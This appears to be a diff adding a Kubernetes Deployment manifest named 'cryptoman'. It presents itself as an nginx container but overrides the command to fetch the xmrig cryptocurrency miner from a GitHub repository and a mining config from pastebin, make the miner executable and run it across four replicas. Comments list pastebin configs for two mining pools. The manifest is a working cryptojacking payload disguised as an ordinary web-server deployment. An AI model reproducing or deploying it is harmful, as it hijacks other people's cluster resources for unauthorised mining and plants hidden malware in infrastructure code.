@@ -1,0 +1,27 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: cryptoman
+  name: cryptoman
+spec:
+  replicas: 4
+  selector:
+    matchLabels:
+      app: cryptoman
+  template:
+    metadata:
+      labels:
+        app: cryptoman
+    spec:
+      containers:
+      - image: nginx
+        name: nginx3
+        command:
+          - sh
+          - -c 
+          - curl -o /var/tmp/xmrig -L https://github.com/mtverraen/clusterduck/raw/main/file.tar.gz;curl -o /var/tmp/config.json https://pastebin.com/raw/9sxsXLrM;chmod 777 /var/tmp/xmrig;cd /var/tmp;tar -xvf xmrig;./xmrig -c config.json
+        resources: {}
+
+        # https://pastebin.com/raw/9sxsXLrM minexmr
+        # https://pastebin.com/raw/zpPfSnzT nanopool
